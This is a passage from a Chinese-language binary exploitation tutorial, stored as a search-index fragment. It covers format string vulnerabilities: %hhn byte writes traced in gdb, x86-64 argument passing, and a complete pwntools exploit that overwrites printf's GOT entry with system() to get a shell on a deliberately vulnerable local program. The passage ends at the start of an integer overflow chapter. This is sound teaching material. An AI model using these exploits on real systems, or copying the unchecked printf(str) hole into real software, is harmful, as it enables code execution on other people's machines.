\u4e2a\u503c\uff0c\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff08\u5c0f\u7aef\u5e8f\uff09\uff1a</p> <pre><code>0xffffd564 -&gt; 0x41414141 (0xffffd538) -&gt; \\x78\n0xffffd568 -&gt; 0x42424242 (0xffffd539) -&gt; \\x56\n0xffffd56c -&gt; 0x43434343 (0xffffd53a) -&gt; \\x34\n0xffffd570 -&gt; 0x44444444 (0xffffd53b) -&gt; \\x12\n</code></pre> <p>\u628a <code>AAAA</code>\u3001<code>BBBB</code>\u3001<code>CCCC</code>\u3001<code>DDDD</code> \u5360\u636e\u7684\u5730\u5740\u5206\u522b\u66ff\u6362\u6210\u62ec\u53f7\u4e2d\u7684\u503c\uff0c\u518d\u9002\u5f53\u4f7f\u7528\u586b\u5145\u5b57\u8282\u4f7f 8 \u5b57\u8282\u5bf9\u9f50\u5c31\u53ef\u4ee5\u4e86\u3002\u6784\u9020\u8f93\u5165\u5982\u4e0b\uff1a</p> <pre><code>$ python2 -c 'print(\"\\x38\\xd5\\xff\\xff\"+\"\\x39\\xd5\\xff\\xff\"+\"\\x3a\\xd5\\xff\\xff\"+\"\\x3b\\xd5\\xff\\xff\"+\"%104c%13$hhn\"+\"%222c%14$hhn\"+\"%222c%15$hhn\"+\"%222c%16$hhn\")' &gt; text\n</code></pre> <p>\u5176\u4e2d\u524d\u56db\u4e2a\u90e8\u5206\u662f 4 \u4e2a\u5199\u5165\u5730\u5740\uff0c\u5360 4*4=16 \u5b57\u8282\uff0c\u540e\u9762\u56db\u4e2a\u90e8\u5206\u5206\u522b\u7528\u4e8e\u5199\u5165\u5341\u516d\u8fdb\u5236\u6570\uff0c\u7531\u4e8e\u4f7f\u7528\u4e86 <code>hh</code>\uff0c\u6240\u4ee5\u53ea\u4f1a\u4fdd\u7559\u4e00\u4e2a\u5b57\u8282 <code>0x78</code>\uff0816+104=120 -&gt; 0x78\uff09\u3001<code>0x56</code>\uff08120+222=342 -&gt; 0x0156 -&gt; 0x56\uff09\u3001<code>0x34</code>\uff08342+222=564 -&gt; 0x0234 -&gt; 0x34\uff09\u3001<code>0x12</code>\uff08564+222=786 -&gt; 0x312 -&gt; 0x12\uff09\u3002\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>$ gdb -q a.out\nReading symbols from a.out...(no debugging symbols found)...done.\ngdb-peda$ b printf  \nBreakpoint 1 at 0x8048350\ngdb-peda$ r &lt; text  \nStarting program: /home/firmy/Desktop/RE4B/a.out &lt; text\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x1\nEDX: 0xf7f9883c --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)\nEIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)\nEFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7e27c1b &lt;fprintf+27&gt;:     ret\n   0xf7e27c1c:  xchg   ax,ax\n   0xf7e27c1e:  xchg   ax,ax\n=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;\n   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243\n   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc\n   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]\n   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\n0004| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888\n0008| 0xffffd534 --&gt; 0x1\n0012| 0xffffd538 --&gt; 0x88888888\n0016| 0xffffd53c --&gt; 0xffffffff\n0020| 0xffffd540 --&gt; 0xffffd55a (\"ABCD\")\n0024| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888\n0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6\ngdb-peda$ x/20x $esp  \n0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888\n0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc\n0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0\n0xffffd55c:     0x00004443      0x00000000      0xffffd538      0xffffd539\n0xffffd56c:     0xffffd53a      0xffffd53b      0x34303125      0x33312563\ngdb-peda$ finish\nRun till exit from #0  0xf7e27c20 in printf () from /usr/lib32/libc.so.6\n[----------------------------------registers-----------------------------------]\nEAX: 0x312\nEBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1\nECX: 0x0\nEDX: 0xf7f98830 --&gt; 0x0\nESI: 0xf7f96e68 --&gt; 0x1bad90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678\nEIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]\n   0x804851a &lt;main+132&gt;:        push   eax\n   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;\n=&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20\n   0x8048523 &lt;main+141&gt;:        sub    esp,0xc\n   0x8048526 &lt;main+144&gt;:        push   0xa\n   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;\n   0x804852d &lt;main+151&gt;:        add    esp,0x10\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678\n0004| 0xffffd534 --&gt; 0x1\n0008| 0xffffd538 --&gt; 0x12345678\n0012| 0xffffd53c --&gt; 0xffffffff\n0016| 0xffffd540 --&gt; 0xffffd55a (\"ABCD\")\n0020| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678\n0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 ('8')\n0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x08048520 in main ()\ngdb-peda$ x/20x $esp\n0xffffd530:     0xffffd564      0x00000001      0x12345678      0xffffffff\n0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0\n0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443\n0xffffd560:     0x00000000      0xffffd538      0xffffd539      0xffffd53a\n0xffffd570:     0xffffd53b      0x34303125      0x33312563      0x6e686824\n</code></pre> <p>\u6700\u540e\u8fd8\u5f97\u5f3a\u8c03\u4e24\u70b9\uff1a</p> <ul> <li>\u9996\u5148\u662f\u9700\u8981\u5173\u95ed\u6574\u4e2a\u7cfb\u7edf\u7684 ASLR \u4fdd\u62a4\uff0c\u8fd9\u53ef\u4ee5\u4fdd\u8bc1\u6808\u5728 gdb \u73af\u5883\u4e2d\u548c\u76f4\u63a5\u8fd0\u884c\u4e2d\u90fd\u4fdd\u6301\u4e0d\u53d8\uff0c\u4f46\u8fd9\u4e24\u4e2a\u6808\u5730\u5740\u4e0d\u4e00\u5b9a\u76f8\u540c</li> <li>\u5176\u6b21\u56e0\u4e3a\u5728 gdb \u8c03\u8bd5\u73af\u5883\u4e2d\u7684\u6808\u5730\u5740\u548c\u76f4\u63a5\u8fd0\u884c\u7a0b\u5e8f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7ed3\u5408\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8bfb\u53d6\u5185\u5b58\uff0c\u5148\u6cc4\u9732\u4e00\u4e2a\u5730\u5740\u51fa\u6765\uff0c\u7136\u540e\u6839\u636e\u6cc4\u9732\u51fa\u6765\u7684\u5730\u5740\u8ba1\u7b97\u5b9e\u9645\u5730\u5740</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#x86-64","title":"x86-64 \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e","text":"<p>\u5728 x64 \u4f53\u7cfb\u4e2d\uff0c\u591a\u6570\u8c03\u7528\u60ef\u4f8b\u90fd\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u53c2\u6570\u3002\u5728 Linux \u4e0a\uff0c\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7 <code>RDI</code>\u3001<code>RSI</code>\u3001<code>RDX</code>\u3001<code>RCX</code>\u3001<code>R8</code> \u548c <code>R9</code> \u4f20\u9012\uff1b\u800c\u5728 Windows \u4e2d\uff0c\u524d\u56db\u4e2a\u53c2\u6570\u901a\u8fc7 <code>RCX</code>\u3001<code>RDX</code>\u3001<code>R8</code> \u548c <code>R9</code> \u6765\u4f20\u9012\u3002</p> <p>\u8fd8\u662f\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6b21\u6211\u4eec\u628a\u5b83\u7f16\u8bd1\u6210 64 \u4f4d\uff1a</p> <pre><code>$ gcc -fno-stack-protector -no-pie fmt.c\n</code></pre> <p>\u4f7f\u7528 <code>AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</code> \u4f5c\u4e3a\u8f93\u5165\uff1a</p> <pre><code>gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nRAX: 0x0\nRBX: 0x0\nRCX: 0xffffffff\nRDX: 0x88888888\nRSI: 0x1\nRDI: 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\")\nRBP: 0x7fffffffe460 --&gt; 0x400660 (&lt;__libc_csu_init&gt;:    push   r15)\nRSP: 0x7fffffffe3c0 --&gt; 0x4241000000000000 ('')\nRIP: 0x400648 (&lt;main+113&gt;:      call   0x4004e0 &lt;printf@plt&gt;)\nR8 : 0x7fffffffe3c6 --&gt; 0x44434241 ('ABCD')\nR9 : 0xa ('\\n')\nR10: 0x7ffff7dd4380 --&gt; 0x7ffff7dd0640 --&gt; 0x7ffff7b9ed3a --&gt; 0x636d656d5f5f0043 ('C')\nR11: 0x246\nR12: 0x400500 (&lt;_start&gt;:        xor    ebp,ebp)\nR13: 0x7fffffffe540 --&gt; 0x1\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40063d &lt;main+102&gt;: mov    r8,rdi\n   0x400640 &lt;main+105&gt;: mov    rdi,rax\n   0x400643 &lt;main+108&gt;: mov    eax,0x0\n=&gt; 0x400648 &lt;main+113&gt;: call   0x4004e0 &lt;printf@plt&gt;\n   0x40064d &lt;main+118&gt;: mov    edi,0xa\n   0x400652 &lt;main+123&gt;: call   0x4004d0 &lt;putchar@plt&gt;\n   0x400657 &lt;main+128&gt;: nop\n   0x400658 &lt;main+129&gt;: leave\nGuessed arguments:\narg[0]: 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\")\narg[1]: 0x1\narg[2]: 0x88888888\narg[3]: 0xffffffff\narg[4]: 0x7fffffffe3c6 --&gt; 0x44434241 ('ABCD')\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe3c0 --&gt; 0x4241000000000000 ('')\n0008| 0x7fffffffe3c8 --&gt; 0x4443 ('CD')\n0016| 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\")\n0024| 0x7fffffffe3d8 (\"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\")\n0032| 0x7fffffffe3e0 (\".%p.%p.%p.%p.%p.%p.%p.\")\n0040| 0x7fffffffe3e8 (\"p.%p.%p.%p.%p.\")\n0048| 0x7fffffffe3f0 --&gt; 0x2e70252e7025 ('%p.%p.')\n0056| 0x7fffffffe3f8 --&gt; 0x1\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0000000000400648 in main ()\ngdb-peda$ x/10g $rsp\n0x7fffffffe3c0: 0x4241000000000000      0x0000000000004443\n0x7fffffffe3d0: 0x4141414141414141      0x70252e70252e7025\n0x7fffffffe3e0: 0x252e70252e70252e      0x2e70252e70252e70\n0x7fffffffe3f0: 0x00002e70252e7025      0x0000000000000001\n0x7fffffffe400: 0x0000000000f0b5ff      0x00000000000000c2\ngdb-peda$ c\nContinuing.\nAAAAAAAA0x1.0x88888888.0xffffffff.0x7fffffffe3c6.0xa.0x4241000000000000.0x4443.0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e.\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6700\u540e\u7684\u8f93\u51fa\u4e2d\uff0c\u524d\u4e94\u4e2a\u6570\u5b57\u5206\u522b\u6765\u81ea\u5bc4\u5b58\u5668 <code>RSI</code>\u3001<code>RDX</code>\u3001<code>RCX</code>\u3001<code>R8</code> \u548c <code>R9</code>\uff0c\u540e\u9762\u7684\u6570\u5b57\u624d\u53d6\u81ea\u6808\uff0c<code>0x4141414141414141</code> \u5728 <code>%8$p</code> \u7684\u4f4d\u7f6e\u3002\u8fd9\u91cc\u8fd8\u6709\u4e2a\u5730\u65b9\u8981\u6ce8\u610f\uff0c\u6211\u4eec\u524d\u9762\u8bf4\u7684 Linux \u6709 6 \u4e2a\u5bc4\u5b58\u5668\u7528\u4e8e\u4f20\u9012\u53c2\u6570\uff0c\u53ef\u662f\u8fd9\u91cc\u53ea\u8f93\u51fa\u4e86 5 \u4e2a\uff0c\u539f\u56e0\u662f\u6709\u4e00\u4e2a\u5bc4\u5b58\u5668 <code>RDI</code> \u88ab\u7528\u4e8e\u4f20\u9012\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u4ece gdb \u4e2d\u770b\u5230\uff0c<code>arg[0]</code> \u5c31\u662f\u7531 <code>RDI</code> \u4f20\u9012\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\uff08\u73b0\u5728\u4f60\u53ef\u4ee5\u518d\u56de\u5230 x86 \u7684\u76f8\u5173\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u5728 x86 \u4e2d\u683c\u5f0f\u5b57\u7b26\u4e32\u901a\u8fc7\u6808\u4f20\u9012\u7684\uff0c\u4f46\u662f\u540c\u6837\u7684\u4e5f\u4e0d\u4f1a\u88ab\u6253\u5370\u51fa\u6765\uff09\u5176\u4ed6\u7684\u64cd\u4f5c\u548c x86 \u6ca1\u6709\u4ec0\u4e48\u5927\u7684\u533a\u522b\uff0c\u53ea\u662f\u8fd9\u65f6\u6211\u4eec\u5c31\u4e0d\u80fd\u4fee\u6539 <code>arg2</code> \u7684\u503c\u4e86\uff0c\u56e0\u4e3a\u5b83\u88ab\u5b58\u5165\u4e86\u5bc4\u5b58\u5668\u4e2d\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#ctf","title":"CTF \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e","text":""},{"location":"Training/Material/Binary%20Exploitation/#pwntools-pwnlibfmtstr","title":"pwntools pwnlib.fmtstr \u6a21\u5757","text":"<p>\u6587\u6863\u5730\u5740\uff1ahttp://pwntools.readthedocs.io/en/stable/fmtstr.html</p> <p>\u8be5\u6a21\u5757\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u5de5\u5177\u3002\u8be5\u6a21\u5757\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b <code>FmtStr</code> \u548c\u4e00\u4e2a\u51fd\u6570 <code>fmtstr_payload</code>\u3002</p> <p><code>FmtStr</code> \u63d0\u4f9b\u4e86\u81ea\u52a8\u5316\u7684\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\uff1a</p> <pre><code>class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)\n</code></pre> <ul> <li>execute_fmt (function)\uff1a\u4e0e\u6f0f\u6d1e\u8fdb\u7a0b\u8fdb\u884c\u4ea4\u4e92\u7684\u51fd\u6570</li> <li>offset (int)\uff1a\u4f60\u63a7\u5236\u7684\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u7a0b\u5e8f\u7684\u504f\u79fb\u91cf</li> <li>padlen (int)\uff1a\u5728 paylod \u4e4b\u524d\u6dfb\u52a0\u7684 pad \u7684\u5927\u5c0f</li> <li>numbwritten (int)\uff1a\u5df2\u7ecf\u5199\u5165\u7684\u5b57\u8282\u6570</li> </ul> <p><code>fmtstr_payload</code> \u7528\u4e8e\u81ea\u52a8\u751f\u6210\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 paylod\uff1a</p> <pre><code>pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')\n</code></pre> <ul> <li>offset (int)\uff1a\u4f60\u63a7\u5236\u7684\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u7a0b\u5e8f\u7684\u504f\u79fb\u91cf</li> <li>writes (dict)\uff1a\u683c\u5f0f\u4e3a {addr: value, addr2: value2}\uff0c\u7528\u4e8e\u5f80 addr \u91cc\u5199\u5165 value \u7684\u503c\uff08\u5e38\u7528\uff1a{printf_got}\uff09</li> <li>numbwritten (int)\uff1a\u5df2\u7ecf\u7531 printf \u51fd\u6570\u5199\u5165\u7684\u5b57\u8282\u6570</li> <li>write_size (str)\uff1a\u5fc5\u987b\u662f byte\uff0cshort \u6216 int\u3002\u544a\u8bc9\u4f60\u662f\u8981\u9010 byte \u5199\uff0c\u9010 short \u5199\u8fd8\u662f\u9010 int \u5199\uff08hhn\uff0chn\u6216n\uff09</li> </ul> <p>\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u719f\u6089\u4e0b\u8be5\u6a21\u5757\u7684\u4f7f\u7528\uff08\u4efb\u610f\u5730\u5740\u5185\u5b58\u8bfb\u5199\uff09\uff1afmt.c fmt</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    char str[1024];\n    while(1) {\n        memset(str, '\\0', 1024);\n        read(0, str, 1024);\n        printf(str);\n        fflush(stdout);\n    }\n}\n</code></pre> <p>\u4e3a\u4e86\u7b80\u5355\u4e00\u70b9\uff0c\u6211\u4eec\u5173\u95ed ASLR\uff0c\u5e76\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7f16\u8bd1\uff0c\u5173\u95ed PIE\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u7684 .text .bss \u7b49\u6bb5\u7684\u5185\u5b58\u5730\u5740\u56fa\u5b9a\uff1a</p> <pre><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space\n$ gcc -m32 -fno-stack-protector -no-pie fmt.c\n</code></pre> <p>\u5f88\u660e\u663e\uff0c\u7a0b\u5e8f\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u7684\u601d\u8def\u662f\u5c06 <code>printf()</code> \u51fd\u6570\u7684\u5730\u5740\u6539\u6210 <code>system()</code> \u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u6837\u5f53\u6211\u4eec\u518d\u6b21\u8f93\u5165 <code>/bin/sh</code> \u65f6\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97 shell \u4e86\u3002</p> <p>\u7b2c\u4e00\u6b65\u5148\u8ba1\u7b97\u504f\u79fb\uff0c\u867d\u7136 pwntools \u4e2d\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u6784\u9020\u51fa exp\uff0c\u4f46\u8fd9\u91cc\uff0c\u6211\u4eec\u8fd8\u662f\u5148\u6f14\u793a\u624b\u5de5\u65b9\u6cd5\u600e\u4e48\u505a\uff0c\u6700\u540e\u518d\u7528 pwntools \u7684\u65b9\u6cd5\u3002\u5728 gdb \u4e2d\uff0c\u5148\u5728 <code>main</code> \u5904\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884c\u7a0b\u5e8f\uff0c\u8fd9\u65f6 libc \u5df2\u7ecf\u88ab\u52a0\u8f7d\u8fdb\u6765\u4e86\u3002\u6211\u4eec\u8f93\u5165 \"AAAA\" \u8bd5\u4e00\u4e0b\uff1a</p> <pre><code>gdb-peda$ b main\n...\ngdb-peda$ r\n...\ngdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd1f0 (\"AAAA\\n\")\nEBX: 0x804a000 --&gt; 0x8049f10 --&gt; 0x1\nECX: 0xffffd1f0 (\"AAAA\\n\")\nEDX: 0x400\nESI: 0xf7f97000 --&gt; 0x1bbd90\nEDI: 0x0\nEBP: 0xffffd5f8 --&gt; 0x0\nESP: 0xffffd1e0 --&gt; 0xffffd1f0 (\"AAAA\\n\")\nEIP: 0x8048512 (&lt;main+92&gt;:      call   0x8048370 &lt;printf@plt&gt;)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8048508 &lt;main+82&gt;: sub    esp,0xc\n   0x804850b &lt;main+85&gt;: lea    eax,[ebp-0x408]\n   0x8048511 &lt;main+91&gt;: push   eax\n=&gt; 0x8048512 &lt;main+92&gt;: call   0x8048370 &lt;printf@plt&gt;\n   0x8048517 &lt;main+97&gt;: add    esp,0x10\n   0x804851a &lt;main+100&gt;:        mov    eax,DWORD PTR [ebx-0x4]\n   0x8048520 &lt;main+106&gt;:        mov    eax,DWORD PTR [eax]\n   0x8048522 &lt;main+108&gt;:        sub    esp,0xc\nGuessed arguments:\narg[0]: 0xffffd1f0 (\"AAAA\\n\")\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd1e0 --&gt; 0xffffd1f0 (\"AAAA\\n\")\n0004| 0xffffd1e4 --&gt; 0xffffd1f0 (\"AAAA\\n\")\n0008| 0xffffd1e8 --&gt; 0x400\n0012| 0xffffd1ec --&gt; 0x80484d0 (&lt;main+26&gt;:      add    ebx,0x1b30)\n0016| 0xffffd1f0 (\"AAAA\\n\")\n0020| 0xffffd1f4 --&gt; 0xa ('\\n')\n0024| 0xffffd1f8 --&gt; 0x0\n0028| 0xffffd1fc --&gt; 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x08048512 in main ()\n</code></pre> <p>\u6211\u4eec\u770b\u5230\u8f93\u5165 <code>printf()</code> \u7684\u53d8\u91cf <code>arg[0]: 0xffffd1f0 (\"AAAA\\n\")</code> \u5728\u6808\u7684\u7b2c 5 \u884c\uff0c\u9664\u53bb\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5373\u504f\u79fb\u91cf\u4e3a 4\u3002</p> <p>\u8bfb\u53d6\u91cd\u5b9a\u4f4d\u8868\u83b7\u5f97 <code>printf()</code> \u7684 GOT \u5730\u5740\uff08\u7b2c\u4e00\u5217 Offset\uff09\uff1a</p> <pre><code>$ readelf -r a.out\n\nRelocation section '.rel.dyn' at offset 0x2f4 contains 2 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n08049ff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__\n08049ffc  00000706 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0\n\nRelocation section '.rel.plt' at offset 0x304 contains 5 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0\n0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0\n0804a014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0\n0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0\n0804a01c  00000607 R_386_JUMP_SLOT   00000000   memset@GLIBC_2.0\n</code></pre> <p>\u5728 gdb \u4e2d\u83b7\u5f97 <code>printf()</code> \u7684\u865a\u62df\u5730\u5740\uff1a</p> <pre><code>gdb-peda$ p printf\n$1 = {&lt;text variable, no debug info&gt;} 0xf7e26bf0 &lt;printf&gt;\n</code></pre> <p>\u83b7\u5f97 <code>system()</code> \u7684\u865a\u62df\u5730\u5740\uff1a</p> <pre><code>gdb-peda$ p system\n$1 = {&lt;text variable, no debug info&gt;} 0xf7e17060 &lt;system&gt;\n</code></pre> <p>\u597d\u4e86\uff0c\u6f14\u793a\u5b8c\u600e\u6837\u7528\u624b\u5de5\u7684\u65b9\u5f0f\u5f97\u5230\u6784\u9020 exp \u9700\u8981\u7684\u4fe1\u606f\uff0c\u4e0b\u9762\u6211\u4eec\u7ed9\u51fa\u4f7f\u7528 pwntools \u6784\u9020\u7684\u5b8c\u6574\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801\uff1a</p> <pre><code># -*- coding: utf-8 -*-\nfrom pwn import *\n\nelf = ELF('./a.out')\nr = process('./a.out')\nlibc = ELF('/usr/lib32/libc.so.6')\n\n# \u8ba1\u7b97\u504f\u79fb\u91cf\ndef exec_fmt(payload):\n    r.sendline(payload)\n    info = r.recv()\n    return info\nauto = FmtStr(exec_fmt)\noffset = auto.offset\n\n# \u83b7\u5f97 printf \u7684 GOT \u5730\u5740\nprintf_got = elf.got['printf']\nlog.success(\"printf_got =&gt; {}\".format(hex(printf_got)))\n\n# \u83b7\u5f97 printf \u7684\u865a\u62df\u5730\u5740\npayload = p32(printf_got) + '%{}$s'.format(offset)\nr.send(payload)\nprintf_addr = u32(r.recv()[4:8])\nlog.success(\"printf_addr =&gt; {}\".format(hex(printf_addr)))\n\n# \u83b7\u5f97 system \u7684\u865a\u62df\u5730\u5740\nsystem_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system'])\nlog.success(\"system_addr =&gt; {}\".format(hex(system_addr)))\n\npayload = fmtstr_payload(offset, {printf_got : system_addr})\nr.send(payload)\nr.send('/bin/sh')\nr.recv()\nr.interactive()\n$ python2 exp.py\n[*] '/home/firmy/Desktop/RE4B/a.out'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './a.out': pid 17375\n[*] '/usr/lib32/libc.so.6'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n[*] Found format string offset: 4\n[+] printf_got =&gt; 0x804a010\n[+] printf_addr =&gt; 0xf7e26bf0\n[+] system_addr =&gt; 0xf7e17060\n[*] Switching to interactive mode\n$ echo \"hacked!\"\nhacked!\n</code></pre> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u83b7\u5f97\u4e86 shell\uff0c\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\u7684\u4fe1\u606f\u548c\u6211\u4eec\u624b\u5de5\u5f97\u5230\u7684\u4fe1\u606f\u5b8c\u5168\u76f8\u540c\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#312","title":"3.1.2 \u6574\u6570\u6ea2\u51fa","text":"<ul> <li>\u4ec0\u4e48\u662f\u6574\u6570\u6ea2\u51fa</li> <li>\u6574\u6570\u6ea2\u51fa</li> <li>\u6574\u6570\u6ea2\u51fa\u793a\u4f8b</li> <li>CTF \u4e2d\u7684\u6574\u6570\u6ea2\u51fa</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#_13","title":"\u4ec0\u4e48\u662f\u6574\u6570\u6ea2\u51fa","text":""},{"location":"Training/Material/Binary%20Exploitation/#_14","title":"\u7b80\u4ecb","text":"<p>\u5728 C \u8bed\u8a00\u57fa\u7840\u7684\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86 C \u8bed\u8a00\u6574\u6570\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u4e0b\u9762\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u6574\u6570\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <p>\u7531\u4e8e\u6574\u6570\u5728\u5185\u5b58\u91cc\u9762\u4fdd\u5b58\u5728\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u7a7a\u95f4\u5185\uff0c\u5b83\u80fd\u5b58\u50a8\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u662f\u56fa\u5b9a\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u53bb\u5b58\u50a8\u4e00\u4e2a\u6570\uff0c\u800c\u8fd9\u4e2a\u6570\u53c8\u5927\u4e8e\u8fd9\u4e2a\u56fa\u5b9a\u7684\u6700\u5927\u503c\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u3002\uff08x86-32 \u7684\u6570\u636e\u6a21\u578b\u662f 